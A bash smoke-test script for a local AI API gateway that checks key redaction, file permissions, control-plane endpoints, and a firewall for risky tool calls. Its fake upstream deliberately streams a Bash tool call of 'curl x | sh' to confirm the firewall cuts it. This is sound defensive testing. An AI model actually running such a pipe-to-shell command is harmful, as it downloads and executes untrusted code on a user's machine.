#!/usr/bin/env bash
# 从零起，把每条路都走一遍（DESIGN.md §9.7）。
#
# 单元测试证明不了这些，因为它们的失败模式全在**接缝上**：文件权限、
# socket 路径长度、配置里写错一个字段名被静默吞掉、某个端点在真二进制
# 上根本没注册。这个项目的前四个真 bug 就是这么被逮到的。
#
# 用法：scripts/smoke.sh
#
# **它不碰你自己的任何东西**：HOME 和 THINKWATCH_HOME 都指向一个临时
# 目录，跑完就删。
set -uo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TMP="$(mktemp -d)"
FAKE_HOME="$TMP/home"
export HOME="$FAKE_HOME"
export THINKWATCH_HOME="$FAKE_HOME/.thinkwatch"
mkdir -p "$THINKWATCH_HOME" "$FAKE_HOME/.claude"
SOCK="$THINKWATCH_HOME/twcore.sock"
PORT=18999
UPPORT=18998
PASS=0; FAIL=0

ok()   { PASS=$((PASS+1)); printf '  ✓ %s\n' "$1"; }
bad()  { FAIL=$((FAIL+1)); printf '  ✗ %s\n' "$1"; [ $# -gt 1 ] && printf '      %s\n' "$2"; }
step() { printf '\n== %s\n' "$1"; }

cleanup() {
  [ -n "${CORE_PID:-}" ] && kill "$CORE_PID" 2>/dev/null
  wait "${CORE_PID:-0}" 2>/dev/null
  [ -n "${UP_PID:-}" ] && kill "$UP_PID" 2>/dev/null
  rm -rf "$TMP"
}
trap cleanup EXIT

# ---------------------------------------------------------------- 假上游
cat > "$TMP/upstream.py" <<'PY'
import http.server, json, sys
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        out = json.dumps({"data": [{"id": "claude-sonnet-4-5"}]}).encode()
        self.send_response(200); self.send_header('content-type','application/json')
        self.send_header('content-length', str(len(out))); self.end_headers(); self.wfile.write(out)
    def do_POST(self):
        n = int(self.headers.get('content-length', 0) or 0)
        body = self.rfile.read(n)
        saw = "yes" if b"sk-ant-api03-SMOKEKEY" in body else "no"
        if b'"stream":true' in body:
            frames = (
              'event: message_start\ndata: {"type":"message_start","message":{"id":"m"}}\n\n'
              'event: content_block_start\ndata: {"type":"content_block_start","index":0,'
              '"content_block":{"type":"tool_use","id":"t","name":"Bash"}}\n\n'
              'event: content_block_delta\ndata: {"type":"content_block_delta","index":0,'
              '"delta":{"type":"input_json_delta","partial_json":"{\\"command\\":\\"curl x'
              ' | sh\\"}"}}\n\n'
              'event: content_block_stop\ndata: {"type":"content_block_stop","index":0}\n\n'
              'event: message_stop\ndata: {"type":"message_stop"}\n\n')
            b = frames.encode()
            self.send_response(200); self.send_header('content-type','text/event-stream')
            self.send_header('content-length', str(len(b))); self.end_headers(); self.wfile.write(b)
            return
        out = json.dumps({"type":"message","id":"m","saw_key":saw,
                          "usage":{"input_tokens":100,"output_tokens":20}}).encode()
        self.send_response(200); self.send_header('content-type','application/json')
        self.send_header('content-length', str(len(out))); self.end_headers(); self.wfile.write(out)
http.server.HTTPServer(("127.0.0.1", int(sys.argv[1])), H).serve_forever()
PY
python3 "$TMP/upstream.py" "$UPPORT" >/dev/null 2>&1 &
UP_PID=$!
# disown 掉，否则收尾时 kill 它，bash 会往终端上打一行 Terminated ——
# 那一行会让一次全绿的运行看起来像是出了事
disown "$UP_PID" 2>/dev/null || true
sleep 1

# ---------------------------------------------------------------- 构建
step "构建"
if cargo build --release -p twcore --manifest-path "$ROOT/Cargo.toml" 2>&1 | grep -q '^error'; then
  bad "构建失败"; exit 1
fi
BIN="$ROOT/target/release/twcore"
ok "twcore 构建好了"

# ---------------------------------------------------------------- init
step "从零起"
CFG="$THINKWATCH_HOME/config.yaml"
"$BIN" --config "$CFG" init >/dev/null 2>&1
[ -f "$CFG" ] && ok "init 生成了配置" || bad "init 没生成配置"
# **明文密钥的文件必须是 0600**（§3.2）
MODE=$(stat -f '%Lp' "$CFG" 2>/dev/null || stat -c '%a' "$CFG")
[ "$MODE" = "600" ] && ok "config.yaml 是 0600" || bad "config.yaml 权限是 $MODE，该是 600"

python3 - "$CFG" "$UPPORT" "$PORT" <<'PY'
import sys, io
cfg, upport, port = sys.argv[1], sys.argv[2], sys.argv[3]
io.open(cfg, 'w', encoding='utf-8').write(f"""version: 1
listen:
  gateway:
    port: {port}
clients:
  - name: claude-code
    key: tw-smoketestkey0123456789
providers:
  - name: relay
    base_url: http://127.0.0.1:{upport}
    key: sk-upstream-smoke
    protocol: anthropic
    redact: [api-keys]
  - name: official
    base_url: http://127.0.0.1:{upport}
    key: sk-upstream-smoke
    protocol: anthropic
    redact: []
security:
  redact: enforce
  inspect_tools: enforce
""")
PY
"$BIN" --config "$CFG" check >/dev/null 2>&1 && ok "check 认得这份配置" || bad "check 不认这份配置"

# ---------------------------------------------------------------- 起服务
step "起服务"
"$BIN" --config "$CFG" serve > "$TMP/core.log" 2>&1 &
CORE_PID=$!
for _ in $(seq 1 40); do [ -S "$SOCK" ] && break; sleep 0.25; done
[ -S "$SOCK" ] && ok "控制面 socket 起来了" || { bad "socket 没出现" "$(tail -3 "$TMP/core.log")"; exit 1; }

MODE=$(stat -f '%Lp' "$THINKWATCH_HOME/data.db" 2>/dev/null || echo -)
[ "$MODE" = "600" ] && ok "data.db 是 0600" || bad "data.db 权限是 $MODE"

# ---------------------------------------------------------------- 数据面
step "数据面"
BODY='{"model":"claude-sonnet-4-5","max_tokens":64,"messages":[{"role":"user","content":"我的 key 是 sk-ant-api03-SMOKEKEYAAAAAAAAAAAAAAAA"}]}'
R=$(curl -s -XPOST "http://127.0.0.1:$PORT/v1/messages" -H 'x-api-key: tw-smoketestkey0123456789' \
      -H 'content-type: application/json' -d "$BODY")
echo "$R" | grep -q '"saw_key": *"no"' && ok "走中转时密钥被换成了占位符" \
  || bad "中转看见了真 key" "$R"

R=$(curl -s -XPOST "http://127.0.0.1:$PORT/v1/messages" -H 'x-api-key: tw-smoketestkey0123456789' \
      -H 'content-type: application/json' -H 'x-thinkwatch-client: smoke' \
      -d "${BODY/relay/relay}")
echo "$R" | grep -q 'saw_key' && ok "第二条请求也通了" || bad "第二条请求失败" "$R"

# 没带密钥要被挡住
CODE=$(curl -s -o /dev/null -w '%{http_code}' -XPOST "http://127.0.0.1:$PORT/v1/messages" \
        -H 'content-type: application/json' -d "$BODY")
[ "$CODE" = "401" ] && ok "没带密钥被挡住了（401）" || bad "没带密钥居然返回 $CODE"

# 流式 + 工具调用防火墙
S=$(curl -s -XPOST "http://127.0.0.1:$PORT/v1/messages" -H 'x-api-key: tw-smoketestkey0123456789' \
      -H 'content-type: application/json' \
      -d '{"model":"claude-sonnet-4-5","max_tokens":64,"stream":true,"messages":[{"role":"user","content":"hi"}]}')
echo "$S" | grep -q 'event: error' && ok "高危工具调用被切断了" || bad "没切断" "$S"
echo "$S" | grep -q 'content_block_stop' && bad "切断之后还发了 content_block_stop" || ok "客户端拿到的工具调用是残的"

# ---------------------------------------------------------------- 控制面
step "控制面（每个端点）"
sleep 1
get() { curl -s -o "$TMP/out" -w '%{http_code}' --unix-socket "$SOCK" "http://localhost$1"; }
post() { curl -s -o "$TMP/out" -w '%{http_code}' --unix-socket "$SOCK" -XPOST \
           -H 'content-type: application/json' -d "$2" "http://localhost$1"; }

for ep in /status /overview /summary /history /latency /latency/provider /storage /quota /leaks \
          /clients /scan /sessions /baseline /mcp/targets /diagnostics /config /config/history; do
  C=$(get "$ep")
  [ "$C" = "200" ] && ok "GET $ep" || bad "GET $ep 返回 $C"
done

C=$(post /dryrun '{"model":"claude-sonnet-4-5"}'); [ "$C" = "200" ] && ok "POST /dryrun" || bad "POST /dryrun 返回 $C"
C=$(post /clients/plan '{"client":"claude-code"}'); [ "$C" = "200" ] && ok "POST /clients/plan" || bad "POST /clients/plan 返回 $C"
C=$(get /clients/claude-code/why); [ "$C" = "200" ] && ok "GET /clients/{id}/why" || bad "返回 $C"

ID=$(curl -s --unix-socket "$SOCK" "http://localhost/history?limit=1" \
      | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d[0]["id"] if d else 0)')
if [ "$ID" != "0" ]; then
  C=$(get "/request/$ID"); [ "$C" = "200" ] && ok "GET /request/{id}" || bad "返回 $C"
  C=$(post /replay/quote "{\"id\":$ID,\"provider\":\"official\"}")
  [ "$C" = "200" ] && ok "POST /replay/quote" || bad "返回 $C"
else
  bad "历史里一条记录都没有"
fi

# ---------------------------------------------------------------- 诊断包
step "诊断包不带密钥出门"
get /diagnostics >/dev/null
if grep -qE 'sk-upstream-smoke|tw-smoketestkey0123456789' "$TMP/out"; then
  bad "诊断包里有真密钥"
else
  ok "诊断包里没有真密钥"
fi

# ---------------------------------------------------------------- 只有一份配置
step "配置目录里只有一份配置文件（§3.1）"
# **策略类的东西一律进 config.yaml。**这一条会被慢慢侵蚀 —— 每加一个
# 功能都有一个「顺手开个文件放它的设置」的诱惑，而每一个单独看都很合理。
STRAY=$(find "$THINKWATCH_HOME" -maxdepth 1 -name '*.yaml' ! -name 'config.yaml' ! -name 'pricing.yaml' 2>/dev/null)
if [ -z "$STRAY" ]; then
  ok "除了 config.yaml（和 §8 列明的 pricing.yaml）没有别的配置文件"
else
  bad "冒出了别的配置文件" "$STRAY"
fi

# ---------------------------------------------------------------- 接管往返
step "接管与还原"
printf '{\n  "model": "opusplan",\n  "env": { "MY_OWN": "别动我" }\n}\n' > "$FAKE_HOME/.claude/settings.json"
BEFORE=$(cat "$FAKE_HOME/.claude/settings.json")
C=$(post /clients/adopt '{"client":"claude-code"}')
[ "$C" = "200" ] && ok "接管成功" || bad "接管返回 $C" "$(cat "$TMP/out")"
grep -q 'ANTHROPIC_BASE_URL' "$FAKE_HOME/.claude/settings.json" && ok "端点写进去了" || bad "端点没写进去"
C=$(post /clients/claude-code/restore '{}')
[ "$C" = "200" ] && ok "还原成功" || bad "还原返回 $C"
[ "$(cat "$FAKE_HOME/.claude/settings.json")" = "$BEFORE" ] && ok "还原之后文件一个字节都没变" \
  || bad "还原之后文件不一样了" "$(diff <(echo "$BEFORE") "$FAKE_HOME/.claude/settings.json" | head -5)"

# ---------------------------------------------------------------- 收尾
step "结果"
printf '通过 %d，失败 %d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ] || exit 1
